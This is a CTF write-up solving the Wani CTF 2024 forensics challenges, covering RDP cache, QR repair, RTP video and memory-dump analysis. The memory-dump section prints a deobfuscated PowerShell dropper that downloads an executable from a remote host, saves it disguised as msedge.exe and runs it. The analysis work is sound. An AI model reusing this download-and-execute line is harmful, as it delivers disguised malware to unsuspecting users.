This is a writeup for all forensics challenges from Wani CTF 2024. This was my first CTF playing for a new Malaysia team called RE:UN10N where local students and professionals come together and have fun. Overall, the CTF was fine, the difficulty rating were kind of messed up since easy challenges were much difficult than hard challenges.

## tiny_usb [Forensics] ðŸ©¸
Question: What a small usb!

Flag: `FLAG{hey_i_just_bought_a_usb}`

We are given an iso file to investigate. Just use 7zip to view the flag which is the only file within it.

## Surveillance_of_sus [Forensics]
Question: A PC is showing suspicious activity, possibly controlled by a malicious individual. It seems a cache file from this PC has been retrieved. Please investigate it!

Flag: `FLAG{RDP_is_useful_yipeee}`

We are given a cache file to investigate. This challenge was somewhat similar to a challenge from Wargames.MY 2023 involving RDP Bitmap Cache which can be parsed and analyzed piece-by-piece. According to the official Microsoft documentation:

> Bitmap caches are used by the client and server to store graphic bitmaps. Each bitmap cache holds bitmaps of a specified size in pixels (known as the "tile size"). If a bitmap does not fit into a single cache entry, the server uses a tiling algorithm to divide the bitmap into tiles that will fit into the cache entries so that they can be stored separately into the cache.

Using tools like [bmc-tools](https://github.com/ANSSI-FR/bmc-tools) and [RdpCacheStitcher](https://github.com/BSI-Bund/RdpCacheStitcher), the flag can be obtained.

```
â””â”€$ python bmc-tools.py -s ~/Desktop/shared/WaniCTF/for-Surveillance-of-sus/Cache_chal.bin -d ~/Desktop/shared/WaniCTF/for-Surveillance-of-sus/
[+++] Processing a single file: '/home/kali/Desktop/shared/WaniCTF/for-Surveillance-of-sus/Cache_chal.bin'.
[===] 650 tiles successfully extracted in the end.
[===] Successfully exported 650 files.
```

## codebreaker [Forensics]
Question: I, the codebreaker, have broken the QR code!

Flag: `FLAG{How_scan-dalous}`

We are given a corrupted QR code to investigate. According to a [writeup](https://github.com/pwning/public-writeup/blob/master/mma2015/misc400-qr/writeup.md), QR codes can be reconstructed by following the structure and format of a QR code. Additionally, increasing the brightness/contrast helps in removing foreign drawings/pixels above the actual image.

For this challenge, my teammate @0x251e managed to help reconstruct the QR code manually so huge shoutout to him. The final output should look like this.

## I_wanna_be_a_streamer [Forensics]
Question: Sorry Mom, I'll work as a streamer. Watch my stream once in a while. (H.264 is used for video encoding.)

Flag: `FLAG{Th4nk_y0u_f0r_W4tching}`

We are given a PCAP file to investigate. Analyzing the packets, the protocols that stood out the most was RTP and RTSP. Fortunately, I have some experience with these protocols due to my final year project. So I assume we have to either listen to the real-time audio or watch the real-time video stream for the flag.

![wani4](/assets/posts/wanictf2024/wani4.png)

Analyzing the RTP streams first, there were only white noise and some faint table noises.

![wani5](/assets/posts/wanictf2024/wani5.png)

Reading the challenge description again, it mentioned something about `H.264 video encoding`. Researching online about this, I stumbled upon this [blog](https://stackoverflow.com/questions/26164442/decoding-rtp-payload-as-h264-using-wireshark) mentioning that RTP packets can be converted to H.264 specifically. A Wireshark [plugin](https://github.com/volvet/h264extractor) can also help in extracting the H.264 packets to form a complete video stream file.

![wani6](/assets/posts/wanictf2024/wani6.png)

After extracting it, play the video stream file with ffmpeg to obtain the flag.

## mem_search [Forensics]
Question: I found an unknown file, and upon opening it, it caused some strange behavior, so I took a memory dump! How was the attack carried out?

Flag: `FLAG{Dayum_this_is_secret_file}`

We are given a memory dump to investigate. Reading the challenge description, it mentioned something about an `unknown file`. Searching common locations on Windows, the unknown file was located in Downloads with its lnk file in Desktop.

```
â””â”€$ python3 vol.py -f ~/Desktop/shared/WaniCTF/chal_mem_search.DUMP windows.filescan | grep -E 'Desktop|Downloads|Documents'
---SNIP---
0xcd88ceba67e0  \Users\Public\Desktop\Microsoft Edge.lnk        216
0xcd88cebac730  \Users\Mikka\Desktop    216
0xcd88cebae1c0  \Users\Mikka\Downloads\read_this_as_admin.download      216
0xcd88cebc26c0  \Users\Mikka\Desktop\read_this_as_admin.lnknload        216
0xcd88cebc3660  \Users\Public\Desktop   216
---SNIP---
```

Dumping and analyzing them, the suspicious lnk file had a suspicious CMD command within it.

```

Decoding the command gives another obfuscated Powershell command.

```
â””â”€$ echo "JAB1AD0AJwBoAHQAJwArACcAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAwAC4AMQA2ADoAOAAyADgAMgAvAEIANgA0AF8AZABlAGMAJwArACcAbwBkAGUAXwBSAGsAeABCAFIAMwB0AEUAWQBYAGwAMQBiAFYAOQAwAGEARwBsAHoAWAAnACsAJwAyAGwAegBYADMATgBsAFkAMwBKAGwAZABGADkAbQBhAFcAeABsAGYAUQAlADMAJwArACcARAAlADMARAAvAGMAaABhAGwAbABfAG0AZQBtAF8AcwBlACcAKwAnAGEAcgBjAGgALgBlACcAKwAnAHgAZQAnADsAJAB0AD0AJwBXAGEAbgAnACsAJwBpAFQAZQBtACcAKwAnAHAAJwA7AG0AawBkAGkAcgAgAC0AZgBvAHIAYwBlACAAJABlAG4AdgA6AFQATQBQAFwALgAuAFwAJAB0ADsAdAByAHkAewBpAHcAcgAgACQAdQAgAC0ATwB1AHQARgBpAGwAZQAgACQAZABcAG0AcwBlAGQAZwBlAC4AZQB4AGUAOwAmACAAJABkAFwAbQBzAGUAZABnAGUALgBlAHgAZQA7AH0AYwBhAHQAYwBoAHsAfQA=" | base64 -d

```

Deobfuscating it shows another base64 encoded string within the Powershell command which was the flag.

```
$u=http://192.168.0.16:8282/B64_decode_RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==/chall_mem_search.exe;$t=WaniTemp;mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
```

â””â”€$ echo "RkxBR3tEYXl1bV90aGlzX2lzX3NlY3JldF9maWxlfQ==" | base64 -d
FLAG{Dayum_this_is_secret_file}
```

## tiny_10px [Forensics]
Question: What a small world!

Flag: `FLAG{b1g_en0ugh}`

We are given a small jpg image to investigate. Since we are given a jpg image, a common steganography method was hiding a flag by manipulating the image's dimensions. Here is a good [reference](https://cyberhacktics.com/hiding-information-by-changing-an-images-height/) I always use to understand jpg formats. 

![wanijpg](/assets/posts/wanictf2024/wanijpg.jpg)

After several minutes of trial-and-error, the width and height was succesfully adjusted and the flag can be obtained.
